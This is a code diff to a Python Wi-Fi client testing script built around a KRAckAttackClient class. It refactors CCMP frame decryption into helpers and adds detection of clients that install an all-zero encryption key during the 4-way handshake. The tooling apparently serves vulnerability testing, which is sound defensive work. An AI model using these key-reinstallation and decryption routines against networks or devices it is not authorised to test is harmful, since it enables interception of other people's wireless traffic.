@@ -223,6 +223,22 @@ def dot11_get_priority(p):
 	if not Dot11QoS in p: return 0
 	return ord(str(p[Dot11QoS])[0])
 
+def get_ccmp_payload(p):
+	# Extract encrypted payload:
+	# - Skip extended IV (4 bytes in total)
+	# - Exclude first 4 bytes of the CCMP MIC (note that last 4 are saved in the WEP ICV field)
+	return str(p.wepdata[4:-4])
+
+def decrypt_ccmp(p, key):
+	payload   = get_ccmp_payload(p)
+	sendermac = p[Dot11].addr2
+	priority  = dot11_get_priority(p)
+	iv        = dot11_get_iv(p)
+	pn        = struct.pack(">I", iv >> 16) + struct.pack(">H", iv & 0xFFFF)
+	nonce     = chr(priority) + sendermac.replace(':','').decode("hex") + pn
+	cipher    = AES.new(key, AES.MODE_CCM, nonce, mac_len=8)
+	plaintext = cipher.decrypt(payload)
+	return plaintext
 
 #### Main Testing Code ####
 
@@ -280,10 +296,7 @@ class ClientState():
 		return self.TK
 
 	def decrypt(self, p, hostapd_ctrl):
-		# Extract encrypted payload:
-		# - Skip extended IV (4 bytes in total)
-		# - Exclude first 4 bytes of the CCMP MIC (note that last 4 are saved in the WEP ICV field)
-		payload = str(p.wepdata[4:-4])
+		payload = get_ccmp_payload(p)
 		llcsnap, packet = payload[:8], payload[8:]
 
 		if payload.startswith("\xAA\xAA\x03\x00\x00\x00"):
@@ -292,14 +305,12 @@ class ClientState():
 			# used). So if the payload seems decrypted, just extract the full plaintext from the frame.
 			plaintext = payload
 		else:
-			client    = self.mac
 			key       = self.get_encryption_key(hostapd_ctrl)
-			priority  = dot11_get_priority(p)
-			iv        = dot11_get_iv(p)
-			pn        = struct.pack(">I", iv >> 16) + struct.pack(">H", iv & 0xFFFF)
-			nonce     = chr(priority) + self.mac.replace(':','').decode("hex") + pn
-			cipher    = AES.new(key, AES.MODE_CCM, nonce, mac_len=8)
-			plaintext = cipher.decrypt(payload)
+			plaintext = decrypt_ccmp(p, key)
+
+			# If it still fails, try an all-zero key
+			if not plaintext.startswith("\xAA\xAA\x03\x00\x00\x00"):
+				plaintext = decrypt_ccmp(p, "\x00" * 16)
 
 		return plaintext
 
@@ -355,6 +366,15 @@ class ClientState():
 				elif self.pairkey_tptk == KRAckAttackClient.TPTK_RAND:
 					msg += " (using TPTK-RAND attack)"
 				log(INFO, (msg + ".") % self.mac, color="green")
+
+	def mark_allzero_key(self, p):
+		if self.vuln_4way != ClientState.VULNERABLE:
+			iv = dot11_get_iv(p)
+			seq = dot11_get_seqnum(p)
+			log(INFO, ("%s: usage of all-zero key detected (IV=%d, seq=%d). " +
+				"Client is vulnerable to installation of all-zero key in the 4-way handshake!") % (self.mac, iv, seq), color="green")
+			log(WARNING, "%s: !!! Other tests are unreliable due to all-zero key usage, please fix this first !!!" % self.mac)
+		self.vuln_4way = ClientState.VULNERABLE
 
 	def groupkey_handle_canary(self, p):
 		"""Handle replies to the replayed ARP broadcast request (which reuses an IV)"""
@@ -506,6 +526,8 @@ class KRAckAttackClient():
 			iv = dot11_get_iv(p)
 			log(DEBUG, "%s: transmitted data using IV=%d (seq=%d)" % (clientmac, iv, dot11_get_seqnum(p)))
 
+			if decrypt_ccmp(p, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00"):
+				client.mark_allzero_key(p)
 			if not self.test_grouphs:
 				client.check_pairwise_reinstall(p)
 			if client.is_iv_reused(p):
